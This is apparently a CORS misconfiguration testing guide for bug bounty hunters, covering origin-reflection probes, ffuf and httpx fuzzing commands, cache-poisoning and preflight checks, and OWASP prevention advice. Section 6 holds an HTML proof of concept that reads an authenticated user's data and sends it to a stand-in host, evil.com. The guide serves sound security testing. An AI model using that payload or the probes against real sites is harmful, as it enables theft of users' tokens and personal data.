# CORS (Cross-Origin Resource Sharing) Misconfiguration

> Comprehensive CORS testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

CORS (Cross‑Origin Resource Sharing) misconfigurations allow malicious sites to read sensitive data (tokens, PII, CSRF tokens) from authenticated users by incorrectly configuring cross‑origin access controls. Based on OWASP CORS Cheat Sheet, PortSwigger CORS labs, MDN Web Docs, and 2025–2026 trends (null origin abuse, reflected Origin trust bypass, credentialed wildcard bypass via weak Vary, preflight OPTIONS abuse, CORS + CSRF/XSS chaining for token theft, ACAO on auth endpoints allowing credential exfiltration).

## Methodology

### 1. Target & Endpoint Identification
- **High‑value endpoints:** Authentication/token endpoints (`/me`, `/user`, `/profile`, `/session`), API routes returning PII/balances/emails (`/api/v1/user`, `/api/account`), endpoints setting/reading cookies (session, auth tokens), GraphQL/REST endpoints behind login, any resource with `Access‑Control‑Allow‑Credentials: true`
- **Common vulnerable patterns:**
  - `Access‑Control‑Allow‑Origin: *` + `Access‑Control‑Allow‑Credentials: true`
  - `Access‑Control‑Allow‑Origin` reflects `Origin` header
  - `Access‑Control‑Allow‑Origin: null`
  - Weak `Vary` header (missing `Origin` → cache poisoning)
  - Preflight (OPTIONS) allows unsafe methods/headers without validation

### 2. Basic Probes & Detection
- **Origin reflection:** Send `Origin: https://evil.com`; if ACAO echoes same origin → vulnerable
- **Wildcard + credentials:** ACAO: `*` + `Access‑Control‑Allow‑Credentials: true` → critical
- **Null origin:** ACAO: `null` → sandboxed iframes/data: URLs can read data
- **Credentialed requests:** Use `credentials: 'include'` from evil.com to exfiltrate data

### 3. Advanced Bypass Techniques (2025–2026)
- **Null origin abuse:** `<iframe srcdoc="...">` with `null` origin reads data
- **Reflected Origin + cache poisoning:** Cache HIT with ACAO: evil.com → all users allow evil.com
- **Credential smuggling:** Use `credentials: 'include'` from evil.com to exfil tokens/PII
- **CORS + CSRF bypass:** Weak CORS → read CSRF token → perform actions
- **CORS + XSS chaining:** Polluted CORS → XSS reads sensitive API
- **Preflight abuse:** OPTIONS allows dangerous methods/headers without auth
- **Vary header weakness:** Missing `Vary: Origin` → cache poisons ACAO → mass exposure

### 4. Chained Exploitation
- **CORS + open redirect:** Phishing page reads API data
- **CORS + XSS:** Steal tokens from same‑origin
- **CORS + CSRF:** Read token → perform authenticated actions
- **CORS + cache poisoning:** Poisoned CORS headers affect all users

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# CORS‑specific tools
git clone https://github.com/chenjj/CORScanner.git  # Python‑based CORS scanner
pip install corsair  # Another CLI CORS scanner

# Parameter discovery & manipulation
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest
```

## Testing Commands

### 1. Basic CORS Detection

```bash
# Test with Origin: evil.com
cat crawledurls.txt | httpx -silent -H "Origin: https://evil.com" -match-string "evil.com" | anew cors-basic-hits.txt

# Test with Origin: null
cat crawledurls.txt | httpx -silent -H "Origin: null" -match-string "null" | anew cors-null-hits.txt

# Test with Origin: target.com.evil.com (subdomain)
cat crawledurls.txt | httpx -silent -H "Origin: https://target.com.evil.com" -match-string "target.com.evil.com" | anew cors-subdomain-hits.txt
```

### 2. Manual Testing with Curl

```bash
# Check ACAO header
curl -H "Origin: https://evil.com" "http://target.com/api" -I | grep -i "access-control"

# Check ACAO with credentials
curl -H "Origin: https://evil.com" -H "Cookie: session=xxx" "http://target.com/api" -I | grep -E "access-control-allow-origin|access-control-allow-credentials"

# Test null origin
curl -H "Origin: null" "http://target.com/api" -I

# Test preflight (OPTIONS)
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" "http://target.com/api" -I
```

### 3. Advanced Origin Fuzzing

```bash
# Create origins list
cat > origins.txt << EOF
https://evil.com
http://evil.com
https://target.com.evil.com
http://target.com.evil.com
https://evil.target.com
http://evil.target.com
null
https://target.com
http://target.com
https://target.com:8080
http://target.com:8080
https://attacker.com
http://attacker.com
EOF

# Fuzz with ffuf
ffuf -u https://target.com/api -H "Origin: FUZZ" -w /home/pwn/wordlists/origins.txt -fr "Access-Control-Allow-Origin" -o ffuf-cors.txt

# Fuzz multiple URLs
cat crawledurls.txt | while read url; do
  ffuf -u "$url" -H "Origin: FUZZ" -w /home/pwn/wordlists/origins.txt -fr "Access-Control-Allow-Origin" -t 10
done
```

### 4. Automated Scanning with CORScanner

```bash
# Scan single URL
python3 cors_scan.py -u https://target.com/api

# Scan list of URLs
cat crawledurls.txt | python3 cors_scan.py -i - | tee cors-results.txt

# With custom origin list
python3 cors_scan.py -u https://target.com/api -o origins.txt
```

### 5. Nuclei Templates for CORS

```bash
# Scan with nuclei CORS templates
nuclei -u https://target.com -t ~/nuclei-templates/cors/ -o nuclei-cors.txt

# Use specific tags
nuclei -u https://target.com -tags cors -o nuclei-cors-tagged.txt
```

### 6. Credentialed Request Testing

```bash
# Simulate credentialed request from malicious origin (requires browser)
# Use HTML PoC:
cat > cors-poc.html << EOF
<script>
fetch('https://target.com/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/exfil?data=' + encodeURIComponent(JSON.stringify(data))));
</script>
EOF

# Serve PoC and test manually
python3 -m http.server 8000
```

### 7. Cache Poisoning Detection (Vary weakness)

```bash
# Check if Vary header includes Origin
curl -H "Origin: https://evil.com" "http://target.com/api" -I | grep -i "vary"

# Test cache poisoning by sending Origin: evil.com and checking cached response
curl -H "Origin: https://evil.com" "http://target.com/api" -I
curl "http://target.com/api" -I  # Should still have ACAO: evil.com if cached incorrectly
```

### 8. Preflight (OPTIONS) Testing

```bash
# Test OPTIONS method with dangerous headers
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: PUT" "http://target.com/api" -I

# Test with custom headers
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Headers: X-Custom-Header" "http://target.com/api" -I

# Check if preflight returns ACAO
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" "http://target.com/api" -I | grep -i "access-control"
```

### 9. Subdomain Origin Testing

```bash
# Test with subdomain origins
for sub in a b c admin api; do
  curl -H "Origin: https://$sub.target.com" "http://target.com/api" -I | grep -i "access-control-allow-origin" && echo "Vulnerable subdomain: $sub"
done
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Null origin sandbox bypass:** Using `srcdoc` iframes with `null` origin
- **Reflected Origin + cache poisoning:** Poison shared cache to affect all users
- **Credential smuggling with wildcard:** `*` + `Allow‑Credentials: true` → any site reads data
- **Preflight abuse:** OPTIONS allows `PUT`, `DELETE`, custom headers without validation
- **Vary header omission:** Missing `Vary: Origin` leads to cache poisoning
- **CORS + CSRF token theft:** Read CSRF token via CORS, then perform actions
- **CORS + XSS chain:** XSS in same origin reads sensitive API via CORS
- **Recent exotic:** ACAO on auth endpoints (token refresh), null + sandbox bypass, preflight on mutation endpoints

## Detection & Verification

- **ACAO: `*` + `Access‑Control‑Allow‑Credentials: true`** → critical misconfiguration
- **ACAO reflects injected Origin** → reflection vulnerability
- **ACAO: `null`** → null origin abuse possible
- **Credentialed request from evil.com reads data** → exfiltration PoC
- **Preflight returns permissive headers** → preflight weakness
- **Cache poisoning** → shared cache returns ACAO for attacker's origin
- **PoC:** HTML page that exfiltrates sensitive data from authenticated user, screenshot of exfiltrated data, network traffic capture

## Prevention (Developer View – OWASP Latest)

1. **Never use wildcard `*` with `Access‑Control‑Allow‑Credentials: true`**
2. **Strict origin validation** – allow‑list exact origins (no wildcards/subdomains unless intended)
3. **Reflect Origin safely** – only if in trusted list; otherwise deny
4. **Always include `Vary: Origin`** – prevent cache poisoning
5. **Avoid ACAO: `null`** – block null origin
6. **Preflight restrictions** – limit methods/headers to safe values
7. **Credentials only when necessary** – prefer token‑based auth without cookies
8. **Regular security testing** – include CORS misconfiguration checks in CI/CD pipelines

## References

- **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/CORS.md](../Web‑Vulnerability‑Testing‑Checklist/CORS.md)
- **PortSwigger CORS**: https://portswigger.net/web‑security/cors
- **PortSwigger Exploiting CORS Misconfigurations**: https://portswigger.net/web‑security/cors/exploiting
- **OWASP CORS Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross‑Origin_Resource_Sharing_Cheat_Sheet.html
- **MDN CORS**: https://developer.mozilla.org/en‑US/docs/Web/HTTP/CORS
- **PayloadsAllTheThings – CORS**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS
- **Recent 2025–2026 write‑ups**: Reflected Origin + cache, null origin sandbox bypass (Intigriti/HackerOne)

> **Happy (ethical) hunting** — CORS misconfigs (wildcard creds, reflected Origin, null abuse) remain a top vector for data exfiltration and token theft in 2026 APIs!